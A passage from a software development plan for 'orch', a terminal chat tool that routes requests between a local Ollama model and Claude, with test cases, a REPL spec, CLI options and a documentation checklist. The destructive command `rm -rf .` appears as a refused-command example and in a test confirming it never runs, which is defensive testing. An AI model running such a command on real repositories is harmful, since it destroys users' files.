  - `the triage sends a request straight to Claude`: the local model gets the triage request and nothing else; Claude's prompt contains the user's message; two records, the first `fallbackReason "triage"` and `escalated true`.
  - `Claude runs in the repository`: `runAgent` was called with `cwd` equal to the root.
  - `hands over when the model asks`, `when it is stuck`, and `when its answer gives up`: reasons `agent_asked`, `step_limit`, `gave_up`; in the last case the dropped answer is not in the prompt Claude receives as an assistant statement.
  - `the transcript for Claude includes what the local model gathered`: a file read before the hand-over appears in the prompt.
  - `the conversation carries over`, including Claude's answer, into the next local turn.
  - `askClaude answers the last question again` with `user_request`; before any message it resolves with an `error`.
  - `no cloud backend` and `a failing cloud backend`: `answeredBy null` with an `error`; the second logs `backend_error` on tier 1.
  - `clear forgets the conversation`.
  - `the transcript file records routing, tool calls and approvals`.
  - Ollama: `chat` with `tools: []` sends a body without a `tools` key.
  - Report: chat records are excluded by default and included with `{ mode: "chat" }`.
- [ ] **Step 2: Run `npm test`.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 5: Commit** — `feat: router and chat session`.

### Task 8: The terminal interface, `orch`, and the documentation

**Files:**
- Create: `src/agent/repl.ts`
- Modify: `src/cli.ts`, `README.md`, `docs/SETUP.md`
- Test: `test/repl.test.ts`, `test/cli-chat.test.ts`

**Interfaces:**
- Consumes: `ChatSession`.
- Produces:

```ts
export function runRepl(opts: {
  input: NodeJS.ReadableStream; output: NodeJS.WritableStream; errOutput: NodeJS.WritableStream;
  createSession: (hooks: { approve: (command: string) => Promise<Approval>; onEvent: (event: AgentEvent) => void }) => ChatSession;
}): Promise<void>;
```

The REPL reads lines from `input` with `node:readline`.
- Prompt `> ` on `output`. A reply is printed as `local> <text>` or `claude> <text>`. A failed turn prints `orch: <error>` on `errOutput`.
- Before a Claude reply, one line on `errOutput` says why: `(to claude: the request needs more than the local model)`, `(to claude: the PC is unreachable)`, `(to claude: the local model got stuck)`, and so on, one text per `EscalationReason`. While Claude works, `errOutput` shows `claude is working... 12s`, rewritten in place when it is a terminal.
- Tool events go to `errOutput`: `  [read_file src/a.ts]`, `  [run] git status -> exit 0`, `  [refused] rm -rf . (rm with -r or -f is not allowed)`.
- An approval prompt on `errOutput`: `Run this command? <command>  [y]es / [n]o / [a]lways: `. The next input line answers it: `y` or `yes`, `a` or `always`; anything else, or the end of input, is `no`.
- Commands: `/claude`, `/clear`, `/help`, `/exit`. An empty line is ignored. End of input exits.

CLI:
- `orch chat [--repo <path>] [--model <name>] [--config <path>]` starts the chat.
- `orch` with no arguments does the same in the current directory when stdin is a terminal. With no arguments and piped stdin it still prints the usage and exits `2`.
- The chain is `config.chains.chat`; its first backend must be an Ollama backend (`ConfigError` otherwise), its second, if present, the Claude backend.
- A root equal to the home directory or `/` is an `InputError`. `onMainBranch` is true when `git rev-parse --abbrev-ref HEAD` in the root prints `main` or `master`; outside a repository it is false.
- A banner on `errOutput` names the local model, the root, and `/help`.

- [ ] **Step 1: Write the failing tests**

`test/repl.test.ts`, with in-memory streams and a `ChatSession` built on fakes:
  - a question and its answer appear on `output` as `> ` and `local> <text>`; nothing but the conversation is on `output`.
  - a routed turn prints the reason line on `errOutput` and `claude> <text>` on `output`.
  - `/claude` prints Claude's answer; `/clear` then a question sends a history without the earlier turn; `/help` lists the four commands; `/exit` ends the loop.
  - an approval line `y` runs the command; `n` does not; *(Review Focus 3)* input that ends at the approval prompt runs nothing and the loop exits cleanly.
  - a failed turn prints `orch:` on `errOutput` and the loop continues.

`test/cli-chat.test.ts`, spawning the CLI with piped stdin, `startFakeOllama(scriptedChat(...))` and a temp repository (every script starts with the triage reply):
  - `answers a question locally using read_file`: stdout contains `local> ` and the answer; the fake server's last request contains the file's text in a tool message.
  - `runs an approved command`: stdin `question`, `y`, `/exit`; the tool message contains the command's output.
  - *(Review Focus 3)* `never runs a refused command`: the model asks for `rm -rf .`; the repository still has its files.
  - `the triage sends a request to Claude`: the triage reply is `CLAUDE`; with `fakeClaudeEnv`, stdout shows `claude> ` and the fake's reply; the fake's recorded arguments contain `Read,Grep,Glob` and its `cwd` is the repository; the log has two `chat` records.
  - `the local model hands over mid-turn` by calling `ask_claude`.
  - `the PC is off`: with a closed port, Claude answers and the first record says `pc_unreachable`.
  - `orch chat refuses the home directory` and `a chain whose first backend is not Ollama`: exit `2`.
  - `orch with no arguments and piped stdin still prints the usage`: exit `2`.
- [ ] **Step 2: Run `npm test`.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Write the documentation.**
  - `README.md`: open with the chat, since it is now the main way in: `cd` into a repository, type `orch`. Then: how routing works and its limit (a confident wrong answer is not caught; `/claude` redoes it), what the local model can do, the approval prompt, the allow-list and how to extend it, the refused commands, what Claude can and cannot do in chat, and what is sent where. Update "Rules this project keeps".
  - `docs/SETUP.md`: Part 3 gains a step "Chat with it", with a short session to try (a question about the repository, a question that needs `git log`, a request to change code, then `/claude`); add it to the not-yet-verified list; add troubleshooting rows for `does not support tool calling`, for a model that sends everything to Claude or nothing (try another model), and for `refused:`.
- [ ] **Step 5: Run the new SETUP step end to end** in a temp repository against a stand-in Ollama that scripts the triage and the tool calls, with the fake `claude` on `PATH`, and fix the text where the output differs.
- [ ] **Step 6: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 7: Commit** — `feat: orch opens a chat that routes between the local model and Claude`.

### On the Mac, with the PC on (manual)

- [ ] `ollama pull` a model with tool support on the PC, set it in `config/orchestrator.local.json`, then `cd` into a repository and type `orch`.
- [ ] Ask something that needs a file. Watch for `[read_file ...]` and a `local>` answer.
- [ ] Ask it to run the tests. Answer the approval prompt.
- [ ] Ask for a code change. It should say `(to claude: ...)` and answer as `claude>` with a diff.
- [ ] After twenty or so messages, run `orch report --mode chat`: it shows how many turns the local model kept and how many it handed over. That number decides whether the triage is worth trusting with this model.

---

## Not in this plan

- Any model changing your files (see "Edits come next").
- `Bash`, `Edit` or `Write` for Claude.
- Streaming answers, or showing Claude's tool activity while it works.
- Conversations that survive a restart.
- A sandbox for commands.
